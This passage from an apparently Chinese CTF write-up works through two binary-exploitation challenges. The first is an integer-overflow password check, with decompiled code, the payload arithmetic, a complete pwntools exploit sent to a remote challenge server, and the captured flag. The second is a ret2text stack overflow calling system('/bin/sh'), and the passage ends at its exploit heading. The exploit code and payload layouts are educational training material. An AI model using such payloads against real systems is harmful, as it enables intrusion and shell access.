read(<span class="number">0</span>, buf, <span class="number">0x199</span>u);<span class="comment">//buf大小为512字节,这里限定读入不超过0x199&lt;512,不会溢出</span></span><br><span class="line">  <span class="keyword">return</span> check_passwd(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="check_passwdbuf">check_passwd(buf)</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">check_passwd</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">11</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]		//注意v3长度为8位,一个字节,能表示[0,255]范围的非负整数</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);							<span class="comment">//strlen返回值可以长于8位,因此会发生溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )			<span class="comment">//要求v3长度在[4,8]之间</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="type">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//需要通过溢出使得前面对v3的限制通过,然后将what_is_this的地址溢出到返回地址</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(dest, s);<span class="comment">//将s拷贝到dest,s最长0x199字节,而dest最长11字节,显然可以溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014 dest            db 11 dup(?)</span><br><span class="line">-00000009 var_9           db ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 s               dd ?                    ; offset</span><br><span class="line">+0000000C</span><br><span class="line">+0000000C ; end of stack variables</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
dest\in [ebp-14h,ebp-9h)
\]</span></p>
<p>溢出时<code>[ebp-0x14h,ebp+0x3h]</code>共24字节用任意字符填空</p>
<p><code>[ebp+4,ebp+7]</code>填上返回值地址<code>0x804868B</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;A&#x27;*24+p32(0x804868B).decode(&#x27;unicode_escape&#x27;)</span><br></pre></td></tr></table></figure>
<p>还要考虑如何通过<code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code></p>
<p><code>unsigned char a=256</code>则实际上<code>a=0</code></p>
<p><code>unsigned char a=260</code>则实际上<code>a=4</code></p>
<p><code>unsigned char a=264</code>则实际上<code>a=8</code></p>
<blockquote>
<p>对256取模</p>
</blockquote>
<p>那么<code>v3 = strlen(s);</code>这里s的长度应该在260到264之间</p>
<p>刚才payload中已经构造出了20个字符,还需要再填充240个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;A&#x27;*24+p32(0x804868B).decode(&#x27;unicode_escape&#x27;)+&#x27;A&#x27;*232</span><br></pre></td></tr></table></figure>
<h3 id="exp-3">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./int_overflow&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;60842&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please input your username:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please input your passwd:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">24</span>+p32(<span class="number">0x804868B</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+<span class="string">&#x27;A&#x27;</span>*<span class="number">232</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Success</span><br><span class="line">cyberpeace&#123;d28ca52ce20608a03519e5fcbd79b1b5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cgpwn2ret2text">005cgpwn2(ret2text)</h2>
<h3 id="反汇编分析">反汇编分析</h3>
<h4 id="main-hello">main()-&gt;hello()</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">hello</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">...<span class="comment">//前面运算了一堆,没有用</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  fgets(name, <span class="number">50</span>, <span class="built_in">stdin</span>);		<span class="comment">//输入姓名,无用之用,方为大用</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,you can leave some message here:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets((<span class="type">char</span> *)&amp;s);<span class="comment">//gets(s)可以实现栈缓冲区溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="pwn">pwn()</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo hehehe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这有一个没有被调用过的函数,pwn(),它使用了system调用shell.</p>
<p>然而它打印的这句话"echo hehehe"是在rodata只读区的,没法溢出修改.</p>
<p>但是pwn不是一无是处,起码有一个可以调用system的地址<code>0x08048420</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804855A                 call    _system</span><br><span class="line"></span><br><span class="line">.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420 _system         endp</span><br><span class="line">.plt:08048420</span><br></pre></td></tr></table></figure>
<p>如果可以修改hello的返回值为<code>0x0804855A</code>,并将期望的命令比如<code>/bin/sh</code>放在栈顶,如此也可以获得shell</p>
<p>下面考虑如何利用<code>return gets((char *)&amp;s);</code>实现栈缓冲区溢出</p>
<h3 id="考虑栈缓冲区溢出">考虑栈缓冲区溢出</h3>
<p>hello函数的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-00000038                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line">...</span><br><span class="line">-00000026 s               dw ?</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">-00000022                 db ? ; undefined</span><br><span class="line">-00000021                 db ? ; undefined</span><br><span class="line">-00000020                 db ? ; undefined</span><br><span class="line">-0000001F                 db ? ; undefined</span><br><span class="line">-0000001E                 db ? ; undefined</span><br><span class="line">-0000001D                 db ? ; undefined</span><br><span class="line">-0000001C                 db ? ; undefined</span><br><span class="line">-0000001B                 db ? ; undefined</span><br><span class="line">-0000001A                 db ? ; undefined</span><br><span class="line">-00000019                 db ? ; undefined</span><br><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014                 db ? ; undefined</span><br><span class="line">-00000013                 db ? ; undefined</span><br><span class="line">-00000012                 db ? ; undefined</span><br><span class="line">-00000011                 db ? ; undefined</span><br><span class="line">-00000010                 db ? ; undefined</span><br><span class="line">-0000000F                 db ? ; undefined</span><br><span class="line">-0000000E                 db ? ; undefined</span><br><span class="line">-0000000D                 db ? ; undefined</span><br><span class="line">-0000000C                 db ? ; undefined</span><br><span class="line">-0000000B                 db ? ; undefined</span><br><span class="line">-0000000A                 db ? ; undefined</span><br><span class="line">-00000009                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line"></span><br><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="开端和尾声-每条指令执行后的栈帧情况分析">开端和尾声
每条指令执行后的栈帧情况分析</h4>
<h5 id="开端">开端:</h5>
<h6
id="text0804864c-call-hello">1.<code>.text:0804864C                 call    hello        ;</code></h6>
<p>call之后hello的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里有一个问题,32位系统上返回值可以用4字节一个int表示,为什么这条call指令要压8字节的栈?</p>
<p>并且将返回值放在低4字节,高四字节全放0?</p>
<p>写了好多程序编译成32位的然后用ida观察都是如此,高四字节都是0.</p>
<p>搜了半天也没找到一个靠谱的答案,pending...</p>
</blockquote>
<h6
id="text08048562-push-ebp-ebp压栈占用4字节">2.<code>.text:08048562                 push    ebp          ;ebp压栈,占用4字节</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048565-push-esi-esi压栈被调用者保存寄存器">3.<code>.text:08048565                 push    esi          ;esi压栈,被调用者保存寄存器</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048566-push-ebx-ebx压栈被调用者保存寄存器">4.<code>.text:08048566                 push    ebx          ;ebx压栈,被调用者保存寄存器</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048567-sub-esp-30h-为局部变量开30h字节的栈空间">5.<code>.text:08048567                 sub     esp, 30h     ;为局部变量开30h字节的栈空间</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-00000038                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line">...</span><br><span class="line">-00000026 s               dw ?</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">-00000022                 db ? ; undefined</span><br><span class="line">-00000021                 db ? ; undefined</span><br><span class="line">-00000020                 db ? ; undefined</span><br><span class="line">-0000001F                 db ? ; undefined</span><br><span class="line">-0000001E                 db ? ; undefined</span><br><span class="line">-0000001D                 db ? ; undefined</span><br><span class="line">-0000001C                 db ? ; undefined</span><br><span class="line">-0000001B                 db ? ; undefined</span><br><span class="line">-0000001A                 db ? ; undefined</span><br><span class="line">-00000019                 db ? ; undefined</span><br><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014                 db ? ; undefined</span><br><span class="line">-00000013                 db ? ; undefined</span><br><span class="line">-00000012                 db ? ; undefined</span><br><span class="line">-00000011                 db ? ; undefined</span><br><span class="line">-00000010                 db ? ; undefined</span><br><span class="line">-0000000F                 db ? ; undefined</span><br><span class="line">-0000000E                 db ? ; undefined</span><br><span class="line">-0000000D                 db ? ; undefined</span><br><span class="line">-0000000C                 db ? ; undefined</span><br><span class="line">-0000000B                 db ? ; undefined</span><br><span class="line">-0000000A                 db ? ; undefined</span><br><span class="line">-00000009                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line"></span><br><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h5 id="尾声">尾声</h5>
<h6
id="text080485fd-add-esp-30h-开端时也是sub-esp30h-这是局部变量的空间溢出成任意字符填空">1.<code>.text:080485FD                 add     esp, 30h     ;开端时也是sub esp,30h 这是局部变量的空间,溢出成任意字符填空</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048600-pop-ebx-被调用者保存寄存器ebx">2.<code>.text:08048600                 pop     ebx          ;被调用者保存寄存器,ebx</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048601-pop-esi-栈顶指针">3.<code>.text:08048601                 pop     esi          ;栈顶指针</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048602-pop-ebp-然后是调用者函数ebp的保存值我们给他溢出成任意字符填空">4.<code>.text:08048602                 pop     ebp          ;然后是调用者函数ebp的保存值,我们给他溢出成任意字符填空</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048603-retn-此处retn-会将我们溢出的返回值放到rip">5.<code>.text:08048603                 retn                 ;此处retn 会将我们溢出的返回值放到rip</code></h6>
<p>此时栈顶为main调用call
hello之前的栈顶,和hello函数一点关系都没有了</p>
</blockquote>
<p>s有38个字节,接下来四个字节是调用者函数ebp帧指针的保存值,接下来四个字节就是返回值,<strong>接下来还有四个字节,没用</strong></p>
<blockquote>
<p>注意最后这四个没用的字节<span
class="math inline">\([ebp+5,ebp+8]\)</span>,也要溢出给他填了,然后再填<code>/bin/sh</code>的地址,</p>
<p>如果溢出修改r之后不填四字节的空,紧接着写<code>/bin/sh</code>的地址,接下来函数尾声会干啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;main调用hello</span><br><span class="line">.text:0804864C                 call    hello		;call指令会将返回值0x08048651压栈,占用4字节空间</span><br><span class="line">.text:08048651                 mov     dword ptr [esp], offset aThankYou ; &quot;thank you&quot;</span><br><span class="line">;开端</span><br><span class="line">.text:08048562                 push    ebp			;ebp压栈,占用4字节</span><br><span class="line">.text:08048563                 mov     ebp, esp		;ebp获得当前esp快照,指向当前函数的栈底</span><br><span class="line">.text:08048565                 push    esi			;esi压栈,被调用者保存寄存器</span><br><span class="line">.text:08048566                 push    ebx			;ebx压栈,被调用者保存寄存器</span><br><span class="line">.text:08048567                 sub     esp, 30h		;为局部变量开30h字节的栈空间</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;尾声</span><br><span class="line">.text:080485FD                 add     esp, 30h		;开端时也是sub esp,30h 这是局部变量的空间,溢出成任意字符填空</span><br><span class="line">.text:08048600                 pop     ebx			;被调用者保存寄存器,ebx</span><br><span class="line">.text:08048601                 pop     esi			;栈顶指针</span><br><span class="line">.text:08048602                 pop     ebp			;然后是调用者函数ebp的保存值,我们给他溢出成任意字符填空</span><br><span class="line">.text:08048603                 retn					;此处retn 会将我们溢出的返回值放到rip,然后退掉这个返回值占用的栈空间,</span><br></pre></td></tr></table></figure>
<p>那么hello函数退栈<strong>刚好将/bin/sh的地址退掉,相当于写了填空了,白写</strong>,此时栈顶是main函数调用hello函数之前的栈顶</p>
</blockquote>
<p>综上栈缓冲区溢出就应该前38+4个字节乱写凑数,</p>
<p>然后返回值写<code>0x0804855A</code></p>
<blockquote>
<p>返回值这里应该写啥也要注意</p>
<p>首先pwn函数里面调用system有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0804855A                 call    _system</span><br></pre></td></tr></table></figure>
<p>然后双击该位置有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420 _system         endp</span><br><span class="line">.plt:08048420</span><br></pre></td></tr></table></figure>
<p>然后再双击<code>off_804A01C</code>又有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A01C off_804A01C     dd offset system        ; DATA XREF: _system↑r</span><br></pre></td></tr></table></figure>
<p>那么溢出的返回值到底是写<code>0x0804855A</code>,还是写<code>0x08048420</code>,还是写<code>0x0804A01C</code>?</p>
<p>实验证明,只有写<code>0x08048420</code>才可以getshell,为什么其他两个不行呢?</p>
<p>对于<code>0x0804855A</code>返回该地址后,紧接着执行的是<code>call    _system</code>,这条指令不光会将程序计数器RIP改成system的地址,还会将返回值压栈,这个压栈就坏了大事,我们费劲千辛万苦把栈顶调成name的地址,现在被返回值又给盖住了,那么调用system函数之后栈顶自然不是<code>/bin/sh</code>的地址,因此不能getshell</p>
<p><code>0x08048420</code>这里只有一个jmp无条件跳转,不会改变栈顶</p>
<p>对于<code>0x0804A01C</code>,相当于省去了前面jmp
的内容,但是却不能成功,目前原因不知道,可能和GOT和PLT有关,但也只是瞎猜的,以后学了这两个东西再说</p>
</blockquote>
<p>然后一个双字写一个字符串"<code>/bin/sh</code>"的地址,但是使用String视图并没有找到这么一个字符串,</p>
<p>因此需要我们自己写一个,写到什么地方呢?</p>
<p>刚才还有一个输入姓名,既然可以输入,说明它不在rodata节,实际上在bss节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br></pre></td></tr></table></figure>
<p>也就是说,在刚才输入姓名的时候,可以直接明目张胆地把<code>/bin/sh</code>写入<code>name</code></p>
<p>然后在溢出时返回值后面写<code>0x0804A080</code>即bss上name的首地址</p>
<h3 id="exp-4">exp</h3>
